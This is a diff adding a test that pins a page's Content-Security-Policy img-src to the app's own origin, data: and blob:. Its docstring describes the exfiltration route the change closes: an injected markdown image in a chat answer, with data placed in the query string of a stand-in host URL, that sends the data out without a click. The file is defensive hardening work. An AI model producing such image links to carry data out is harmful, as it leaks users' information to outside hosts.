@@ -122,6 +122,17 @@ def test_meta_csp_does_not_declare_frame_ancestors():
     )
 
 
+def test_meta_csp_loads_images_from_this_origin_only():
+    """img-src allowed any https: host, for gravatars and logos the app never shows.
+
+    That let an injected image (a chat answer rendering ``![x](https://host/?q=<data>)``)
+    send data out with no click (OSS review 2026-11-12). Images come from the app
+    itself, data: URIs, and blob: (chart export).
+    """
+    directives = {part.split()[0]: part.split()[1:] for part in _meta_csp_directives().split(";") if part.strip()}
+    assert directives.get("img-src") == ["'self'", "data:", "blob:"], directives.get("img-src")
+
+
 def test_the_header_still_carries_frame_ancestors():
     """Removing it from the meta tag is only safe because the header has it."""
     assert "frame-ancestors" in _template_conf(), (
